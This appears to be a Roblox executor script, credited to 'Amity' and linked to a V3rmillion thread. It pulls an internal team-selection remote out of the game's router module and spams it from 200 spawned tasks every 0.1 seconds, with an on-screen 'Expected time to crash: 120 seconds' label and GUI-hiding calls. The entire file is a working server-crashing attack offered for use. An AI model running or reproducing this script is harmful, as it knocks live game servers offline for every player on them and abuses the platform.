game:FindService("RunService"):Set3dRenderingEnabled(false) --saves on CPU
local start = tick()
local remote = getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init,4)['TeamAPI/ChooseTeam']
local task = task
local pcall = pcall

local function Create(object,data)
    local obj = Instance.new(object)
    
    for i,v in next, data do
        obj[i] = v
    end
    return obj
end

local function functioninquestion()
    pcall(function()
        remote:InvokeServer("Babies",true)
    end)
end

task.spawn(function()
    local debounce = false
    local hide = (syn and syn.protect_gui) or get_hidden_gui or gethui
    local UI = Create("ScreenGui",{ResetOnSpawn = false,Parent = game:FindService("CoreGui")})
    local time = Create("TextLabel",{Font = Enum.Font.Nunito,TextColor3 = Color3.new(0.466667, 0.360784, 1),TextScaled = true,TextSize = 45,TextStrokeTransparency = 0,TextWrapped = true,AnchorPoint = Vector2.new(0.5, 0.1),BackgroundColor3 = Color3.new(1, 1, 1),BackgroundTransparency = 1,Position = UDim2.new(0.5, 0, 0, 0),Size = UDim2.new(0.200000003, 0, 0.100000001, 0),Visible = true,Parent = UI})
    Create("TextLabel",{Font = Enum.Font.Nunito,Text = "| Made by Amity |\nIf you got this script from anywhere else besides\n\nThey did not get permission to repost it",TextColor3 = Color3.new(0.466667, 0.360784, 1),TextSize = 35,TextStrokeTransparency = 0,TextWrapped = true,AnchorPoint = Vector2.new(0.5, 0.4000000059604645),BackgroundColor3 = Color3.new(1, 1, 1),BackgroundTransparency = 1,Position = UDim2.new(0.5, 0, 0.72, 0),Size = UDim2.new(0.600000024, 0, 0.25, 0),Visible = true,Parent = UI})
    local V3rmillionLink = Create("TextButton",{Font = Enum.Font.Nunito,Text = "https://v3rmillion.net/showthread.php?tid=1196278&pid=8416203",TextColor3 = Color3.new(1, 0, 0),TextSize = 35,TextStrokeColor3 = Color3.new(0.109804, 0.0862745, 0.239216),TextStrokeTransparency = 0,TextWrapped = true,AnchorPoint = Vector2.new(0.5, 0.4000000059604645),BackgroundColor3 = Color3.new(1, 1, 1),BackgroundTransparency = 1,Position = UDim2.new(0.5, 0, 0.76, 0),Selectable = true,Size = UDim2.new(0.600000024, 0, 0.1, 0),Visible = true,Parent = UI})
    Create("TextLabel",{Font = Enum.Font.Nunito,Text = "Expected time to crash: 120 seconds",TextColor3 = Color3.new(0.466667, 0.360784, 1),TextSize = 45,TextStrokeTransparency = 0,AnchorPoint = Vector2.new(0.5, 0.1),BackgroundColor3 = Color3.new(1, 1, 1),BackgroundTransparency = 1,Position = UDim2.new(0.5, 0, 0.1, 0),Size = UDim2.new(0.200000003, 0, 0, 0),Visible = true,Parent = UI})
    pcall(hide,UI)--Cant be asked to read documentation on all the functions
    V3rmillionLink.MouseButton1Click:Connect(function()
        if debounce then return end
        debounce = true
        local oldtext = V3rmillionLink.Text
        if setclipboard then
            setclipboard("https://v3rmillion.net/showthread.php?tid=1196278&pid=8416203")
            V3rmillionLink.Text = "Copied"
        else
            V3rmillionLink.Text = "Executor does not support : setclipboard"
        end
        wait(3)
        V3rmillionLink.Text = oldtext
        debounce = false
    end)

    while wait(1) do
        time.Text = "Elapsed time: "..math.round(tick()-start)
    end
end)

while task.wait(0.1) do
    for i = 1,200 do
        task.spawn(functioninquestion)
    end
end
